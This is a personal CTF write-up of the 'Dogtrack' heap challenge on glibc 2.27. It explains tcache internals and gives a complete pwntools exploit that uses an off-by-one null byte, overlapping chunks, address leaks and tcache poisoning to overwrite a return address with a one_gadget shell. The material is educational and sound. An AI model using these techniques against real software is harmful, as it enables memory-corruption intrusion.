+++
title = "BKCTF Dogtrack writeup"
date = 2026-02-28
+++

hi!!!
last week there was a ctf that i participated in that had some pwn challenges.
i hadn't done a ctf for a few months but a few weeks ago i started relearning and practicing some rop and printf stuff.
to my surprise i was able to solve all challenges except for the one heap challenge (the topic of this writeup) very smoothly!!
very happy about that :)
but i was very dissatisfied with solving all but one challenge...
so i attempted my first ever heap challenge and after like 7 hours of various phases of bashing my head against the monitor (not literally) eventually managed to solve it!!

# heap overview
idk who's going to read this so i'll include a summary of the heap concepts needed to understand this exploit.
if you are familiar with heap exploitation feel free to skip this section.

## malloc chunks
when malloc creates an allocation, it actually gives you a `0x10` offset into what is called a chunk.
this is the contents of a struct taken from [the source code of malloc](https://elixir.bootlin.com/glibc/glibc-2.27.9000/source/malloc/malloc.c).
```c
struct malloc_chunk {

  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```
the `fd`, `bk`, `fd_nextsize` and `bk_nextsize` fields are used in free routines we will very briefly mention later.
an allocation will sit on top of those fields.
because this chunk metadata needs to be stored somewhere, malloc will pad allocations to fit the data.
however, it turns out that the `mchunk_prev_size` field is not needed when two chunks are allocated adjacent to each other (we'll get to why in a second!)
malloc does want to ensure `0x10` alignment of all chunks though.
hence malloc will pad allocations of sizes such as `0x28` to be of size `0x30`, whereas allocations of size `0xf0` will be padded to `0x100`.

the other important thing to note is where allocations are placed.
we'll see soon that allocations that have been freed try to be reused, but if there is nothing to reuse, malloc will take memory from the end of a contiguous region it will have asked the os for.
knowing this means we can deterministically know where allocations will be placed!!

## tcache
pretty much all of the fun exploitation comes from calls to `free` (that i've seen, at least).
lots of work is put in to make sure that allocations that have been freed can be reused so that new memory doesn't have to be requested from the os.
one of the things that gets used is the tcache, which is the first place allocations try to be "stored" in.
it has very few protections (more in later versions) which makes it very useful for exploitation!
so how does it work?

the tcache only gets used for small allocations (of size `<= 0x400` iirc).
this is what the tcache struct looks like
```c
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```
and this is what a `tcache_entry` looks like
```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;
```
on later versions there's also a key field which is used to detect double frees, but on this version we don't have to worry about that!
when an allocation is freed, it first calculates some index into the tcache struct, and if the count of that index is small enough (less than 7), it will be put into the tcache.
the put source code is small enough to fit here!
```c
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```
as we see, the allocation is interpreted as a tcache_entry.
this means that data will be written to the allocation that we could potentially read or write to with a use after free!
we can also observe that there's a linked list structure going on in `tcache_entry`.
the tcache struct stores the head pointer, then each entry that has been put into the tcache points to a next chunk.
we can see in the get source code that nodes get popped as we would expect.
```c
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```
the important thing for us is that if we can control a tcache next pointer, we can control what addresses malloc will return from the tcache!
this process is known as tcache poisoning.
note that we do have to ensure the tcache count is large enough for malloc to think it can be used.
this can let us get allocations at completely controlled addresses leading to arbitrary reads and writes, and this is something we will be doing in the challenge.

## the rest of freeing
if the tcache can't be used for whatever reason, there are a whole sequence of "bins" that `free` will try to store allocations into.
when i was doing this challenge, i did not understand the intricacies of how they all worked, and so i won't explain it all in detail.
in essence however, we can mostly rely on our intuition about how we expect chunks that are left over to be reused and use tools such as gdb gef's `heap bins` command to confirm our intuition.

when a chunk gets freed without the tcache, one thing it may check for is whether the chunk immediately before it is in use.
it turns out that in the `mchunk_size` field, the bottom three bits are used as flags, and one of them is a `PREV_INUSE` flag.
if free sees that the previous chunk is not in use, it can join this chunk to the chunk immediately before it by increasing its size.
it can know where the previous chunk is by moving backwards by `mchunk_prev_size` bytes (which it assumes is correct).
this is important for this challenge because we will be messing with the `PREV_INUSE` flag.
note that this process wont happen if the chunk is the last chunk that was allocated, since instead the top region will be joined with this allocation.

if free can't join chunks, it will store some values in those `fd`, `bk`, `fd_nextsize` and `bk_nextsize` fields based on the bin logic.
all that's important here is that on the first free, `fd` and `bk` will point to an address in libc (the main arena struct)!
they are pointers encoding a doubly linked list, and the head turns out to sit in libc.
this gives us an way to leak a libc address and compute it's base address!

# inspecting the binary
we'll now move on to the challenge itself!
here's the (truncated) checksec
```
RELRO           Stack Canary      NX            PIE
Full RELRO      Canary Found      NX enabled    PIE Enabled
```
also libc is 2.27 (old...)

we aren't given source code in this challenge and so have to reverse it ourselves.
(umm i used binary ninja btw binja mentioned (<-- binja mention)!!!!)
this was my first ctf using binja (i had always used ghidra before) and i think it's pretty good!
the startup time is certainly much better than ghidra's and i think the emitted il is on average more readable than ghidras.
of course this is just the free version, idk what the paid version is like.

so the main function looks like this
```c
int32_t main(int32_t argc, char** argv, char** envp) {
    setbuf(fp: stdin, buf: nullptr);
    setbuf(fp: stdout, buf: nullptr);
    gameLoop();
    return 0;
}
```
the `setbuf` calls will prevent buffered io, and in particular will prevent any stray allocations from any io procedures!
this is good to know as it means any allocation that does happen will be (or should be) in the binary directly.
the `gameLoop` is quite big and is split into a bunch of parts.
i won't write out the whole thing, only the important bits.
it starts off printing this menu
```
Welcome to the Dog Track!

Select Option
1) Go to pound
2) Start race
3) Hall of Fame
4) Quit
```
options 1 and 3 will open their own menus
```
Welcome to the pound!
1) Breed dog
2) Release dog
3) Leave
```
and
```
Welcome to the Hall of Fame!
1) Read Record
2) Wipe Record
3) Leave
```
there's also a secret 4th option that isn't written for the hall of fame called swap which we'll go through later.
so really we have 6 operations that we can perform: breeding a dog, releasing a dog, performing a race, reading a record, wiping a record and swapping.
let's look at these operations one by one in hope to find some sort of vulnerability!

## breed dog
the program prompts the user for a dog index between 0 and 2 inclusive, then executes this code (idk why the syntax highlighter highlights hex values like that)
```c
if (dogs[dog_index] == 0) {
    struct dog* buf = malloc(0x28);
    puts("What is the dog's name?");
    printf("(Max 32 characters) > ");
    fgets(&buf->name, n: 0x20, fp: stdin);
    buf->name[strcspn(&buf->name, "\n")] = 0;
    buf->__offset(0x28).b = 0;
    puts("How would you describe their speed?");
    printf("(Max 8 characters) > ");
    fgets(buf, 8, stdin);
    dogs[dog_index] = buf;
    printf("%s has been born into kennel %d!\n", &buf->name, dog_index);
    numOfDogs += 1;
    continue;
} else {
    printf("Kennel %d is occupied!\n", dog_index);
    continue;
}
```
here `dogs` is some bss array of pointers.
notice the `0x28` allocation!
for completeness the dog struct that i've made in binja looks like this.
```c
struct dog __packed
{
    char speed[0x8];
    char name[0x20];
};
```
with this struct representation binja makes it very clear that there is an out of bounds null byte write!!
on libc 2.27 this can relatively easily be used to mess with chunk metadata, as this out of bounds write will write directly into the first byte of the `mchunk_size` of the next chunk's allocation!
other than that, we note that we can control the name and speed value of the dog within bounds as long as the names do not contain new lines (because of fgets) and this includes the `mchunk_prev_size` field of the next chunk.

## release dog
again, a dog index is prompted for and then this code is run
```c
if (dogs[dog_index] != 0) {
    free(dogs[dog_index]);
    dogs[dog_index] = 0;
    numOfDogs -= 1;
    continue;
} else {
    puts(str: "That kennel is empty!");
    continue;
}
```
as we can see, a check is performed to ensure that the dog we are freeing hasn't already been freed.
this stops an easy use after free from occuring, so we need to do something else...

## race
a dog index is prompted for (the dog that will race), checked for being non null, and then a bunch of complicated stuff happens, but most of it isn't needed for the exploit
```c
char* dog = dogs[dog_index];
char* record = malloc(0xf0);
for (int32_t j = 0; j <= 0x1f; j += 1) {
    if (dog[j + 8] == 0) break;
    record[j] = *(dog + j + 8);
}

/* ... Racing stuff */

// simplified
winRecords[numOfRecords & 0xf] = record;
numOfRecords += 1;
continue;
```
again for completeness this is my binja created record struct.
```c
struct record __packed
{
    char name[0x20];
    time_t time;
    uint64_t placement;
    char opponents[0x8][0x18];
};
```
as we can see, an allocation of size `0xf0` (or chunk size `0x100`) is made, and the name of the dog is copied into it until a null byte is hit, and importantly the null byte is *not* set in the record.
this is huge!!
if we race a dog with name as just a null byte, then the entry have its name field be whatever data was left in it from allocating (perhaps a tcache or libc main arena address?!)
it also means we can write whatever data we want to the start of the record (perhaps for tcache poisoning or an arbitrary write primitive?!)

## read record
here a record index is prompted for, in the range from 0 to 15 inclusive, then if it is non null this code is executed
```c
struct record* record = winRecords[record_index];
printf("Dog: %s\n%s\nWins: %ld", record->name, ctime(record->time), record->placement);

/* ... print racing stuff */

continue;
```
yay!! so we can leak any pointers stored into `name` with this operation

## wipe record
again a record index is prompted for, then this is executed
```c
if (winRecords[record_index] != 0) {
    free(winRecords[record_index]);
    winRecords[record_index] = 0;
    numOfRecords -= 1;
    continue;
} else {
    printf("Record %d doesn't exist!\n", record_index);
    continue;
}
```
there's another use after free protection here... we can't just free an allocation twice!
instead we'll have to do something special

## swap
when the secret fourth option is chosen, two non null records are prompted for, then this code is executed
```c
struct record* record1 = winRecords[record_index1];
struct record* record2 = winRecords[record_index2];
char tmp_name[0x20];
memset(tmp_name, 0, 0x20);
/* time stuff */
strcpy(tmp_name, record1);
strcpy(record1, record2);
strcpy(record2, tmp_name);
printf("Record %d and %d have been swapped!\n", record_index, record_index2);
continue;
```
since strcpy is used, this will let us copy the name up to a null byte of one record into another.
this is effectively a way to write to a record!!
very useful

# boilerplate script
i wanted to include the starter boilerplate of the pwntools script for completeness, but nothing here is important.
it's whatever `pwninit` generated plus helper functions to interact with the menu.
```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./dogtrack_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote('url went here', 1337, ssl=True)

    return r

TIMEOUT=0.2 # the remote was too slow (ping wise) for slower timeouts :( australia moment

def main():
    r = conn()

    def breed_dog(idx, name, speed):
        r.sendline(b'1')
        r.sendline(b'1')
        r.sendline(str(idx).encode())
        r.sendline(name)
        r.sendline(speed)
        r.sendline(b'3')
        r.clean(timeout=TIMEOUT)

    def release_dog(idx):
        r.sendline(b'1')
        r.sendline(b'2')
        r.sendline(str(idx).encode())
        r.sendline(b'3')
        r.clean(timeout=TIMEOUT)

    def run_race(idx):
        r.sendline(b'2')
        r.sendline(str(idx).encode())
        r.clean(timeout=TIMEOUT)

    def clear_record(idx):
        r.sendline(b'3')
        r.sendline(b'2')
        r.sendline(str(idx).encode())
        r.sendline(b'3')
        r.clean(timeout=TIMEOUT)

    def read_record_name(idx):
        r.sendline(b'3')
        r.sendline(b'1')
        r.sendline(str(idx).encode())
        r.readuntil(b'Dog: ')
        name = r.readuntil(b'\n', drop=True)
        r.sendline(b'3')
        r.clean(timeout=TIMEOUT)
        return name

    def swap_records(i, j):
        r.sendline(b'3')
        r.sendline(b'4')
        r.sendline(str(i).encode())
        r.sendline(str(j).encode())
        r.sendline(b'3')
        r.clean(timeout=TIMEOUT)

    def make_record_name(dogidx, name):
        breed_dog(dogidx, name, b'\0')
        run_race(dogidx)
        release_dog(dogidx)
```

# tcache and libc leak
to get a libc leak (and tcache leak with it) we'll need to call free enough times that the tcache is filled
```py
breed_dog(0, b'\0', b'\0')
for _ in range(9):
    run_race(0)
for i in range(9):
    clear_record(i)
```
now when we make more allocations, the tcache entries will be used up and then an entry from the unsorted (or whatever it is) bin will be taken.
we can then read the `tcache_next` and `fd` fields from each entry to et a tcache leak and libc leak!
note all magical offsets that you see will have been computed using gdb.
```py
for _ in range(9):
    run_race(0)
tcache_leak = u64(read_record_name(5).ljust(8, b'\0'))
print('tcache leak:', hex(tcache_leak))
libc_leak = u64(read_record_name(7).ljust(8, b'\0'))
libc.address = libc_leak - libc.sym['main_arena'] - 96
print('libc base:', hex(libc.address))
```

# oob null byte to overlapping allocation
if you recall, creating a new dog will set an out of bounds byte to 0.
since its allocation has size `0x28`, this means that it will overwrite the bottom byte of the size field of the next chunk.
in particular, it will set its `PREV_INUSE` bit to false!
we can then free the next chunk after messing with its prev_size field and to create a free chunk over the dog to create an overlapping allocation.
we'll want to free the record sitting before the dog first so that the dog sits in the middle of this big free chunk to avoid segfaulting from some of the doubly linked list logic (the previous chunk will be a valid previous chunk).
lets lay this out in a diagram
```
,____________,___________,____________,_________,
|  Record 9  |   Dog 1   |  Record 10 | barrier |
| size 0x100 | size 0x30 | size 0x100 |         |
|____________|___________|____________|_________|
```
the barrier is to avoid interference with the top chunk.
firstly we fill the 0x100 tcache so that all subsequent frees go into the unsorted bin.
then we will free record 9 and overwrite the `PREV_INUSE` bit and `prev_size` of record 10.
notice that with a chunk size of `0x100`, overwriting the bottom byte will *only* change the `PREV_INUSE` bit, nothing else (the other chunk flags aren't relevant here)!
after we free record 10, the unsorted bin will contain a `0x230` size chunk at the base address of record 9.
```py
run_race(0) # record 9
breed_dog(1, b'\0', b'\0') # dog
run_race(0) # record 10
run_race(0) # barrier
# fill the 0x100 tcache
for i in range(0, 7):
    clear_record(i)
# free chunk 9 without tcache before the dog
clear_record(9)
# replace the dog to say record 10's prev chunk is unused
release_dog(1)
breed_dog(1, b'a'*24 + p64(0x130)[0:7], b'\0')
# free record 10 without tcache
clear_record(10)
```
the state now looks like this with the dog sitting in the middle of a free chunk.
```
,____________,______________,______________,_________,
|  free      | Dog/record   | same free    | barrier |
| size 0x230 | size 0x30    | size 0x230   |         |
|  offset 0  | offset 0x100 | offset 0x130 |         |
|____________|______________|______________|_________|
```
we can then allocate twice to have record sitting at the same address as the dog.
since we have a pointer to the dog, we can then free it and add its address to the tcache.
the dog now has a chunk size of `0x100`, so it will be added to the `0x100` tcache, which we can then give to a record.
```py
# Use up tcache allocations
for _ in range(7):
    run_race(0)
# allocate in the index 9 region we filled
run_race(0)
# use the wrong chunk information in index 10 to allocate over the dog (into index 11)
run_race(0) # (index 11)
# release "size 0x100" dog
release_dog(1)
# double allocate record 10 buf
run_race(0) # (index 12)
```
now we have two records pointing to the same address!
this lets us bypass the null pointer use after free check that the program has, and properly perform tcache poisoning!

# tcache poison to arbitrary read/write
we now have two records sitting at the same address.
we can free one of them to put it into the tcache, then write over its tcache next pointer field to get an arbitrary allocation!
we'll make an allocation at the tcache's `entries[idx]` address so that we can easily allocate wherever we want by writing to the entry with a swap.
since we have all of these tcache popped "real" allocations with next pointers stored in them stored as random records, we have a pool of heap address to move into the `tcache_entry` field.

the first thing we have to do is create two (technically three, see the comment) tcache entries so that the `tcache_count` field is high enough to use our poisoned tcache value.
afterwards we can make the chosen allocation.
since we're on glibc 2.27, we don't have to worry about overwriting the tcache `key` field.
```py
tcache_entry = tcache_leak - 0x1d0
clear_record(3) # our first leftover record (note that records are stored at index recordCount)
clear_record(12) # count = 11
clear_record(10) # count = 10, must free three times to not overwrite the double freed record
# poison the tcache_next field
make_record_name(1, p64(tcache_entry))
swap_records(10, 11)
# make a normal allocation with a normal address
make_record_name(1, p64(tcache_leak))
```
at this point, performing a malloc will make an allocation on `tcache_entry`, but we want to decide what to allocate next since we also get to choose what is written to its address.
i did *not* do the simplest path for solving this challenge at all.
you'd want to write to `__free_hook` in libc a pointer to `system`, so that freeing a record with name `/bin/sh` would create a shell, but i didn't know `__free_hook` existed...
so instead we'll be doing a proper return address overwrite.
this requires us to do many more allocations, and so we need the tcache_count field to say some number allowing us to pop from the tcache many times.
hence we'll make the record after this one point to tcache_count and write 7 to it.
```py
tcache_count = tcache_leak - 0x280 + 0xe
make_record_name(1, p64(tcache_count))
make_record_name(1, b'\07')
TCACHE_ENTRY = 12 # index of tcache_entry record
```

# arb read/write to win
now to actually win the challenge.
i ended up just jumping to a one_gadget to get a shell.
to do this we need a stack address leak to know where the `gameLoop` return address is.
it took me a very long time to figure this out, but apparently you can always read a stack address if you know where libc is, which we do!
this is because at the symbol `__libc_argv`, libc has stored the address of argv which lives on the stack!
note that this symbol lives in a writable section of libc's memory mapping, so we don't have to worry about record creation segfaulting when it writes its race data stuff.
```py
swap_records(4, TCACHE_ENTRY)
make_record_name(1, p64(libc.sym['__libc_argv']))
swap_records(14, TCACHE_ENTRY)
make_record_name(1, b'\0') # don't overwrite __libc_argv
rip_leak = u64(read_record_name(15).ljust(8, b'\0')) - 0xf0
print('gameLoop rip:', hex(rip_leak))
```
now, which gadget to use?
this is the output of `one_gadget` run on libc
```
0x4f29e execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv

0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```
after inspecting each one i decided the `0x70` gadget was the simplest to meet the constraints of.
unfortunately there were still two bytes that needed to be zeroed, and since swapping uses strcpy, we have to make an entire new allocation for each byte.
oh well!!! let's do it
```py
# write the bytes (i couldn't be bothered to make a function to write to an address sorry)
swap_records(5, TCACHE_ENTRY)
make_record_name(1, p64(rip_leak + 0x78 + 4))
swap_records(0, TCACHE_ENTRY)
make_record_name(1, b'\0')
swap_records(1, 4)
swap_records(6, TCACHE_ENTRY)
make_record_name(1, p64(rip_leak + 0x78 + 5))
swap_records(2, TCACHE_ENTRY)
make_record_name(1, b'\0')
swap_records(3, 9)
# write the gadget
gadget = libc.address + 0x10a2fc
print('gadget:', hex(gadget))
swap_records(7, TCACHE_ENTRY)
make_record_name(1, p64(rip_leak))
swap_records(4, TCACHE_ENTRY)
make_record_name(1, p64(gadget))
```
and finally, exit the program and execute the gadget!!!
```py
r.sendline(b'4')
r.interactive()
```
and we get a shell yayyyyy
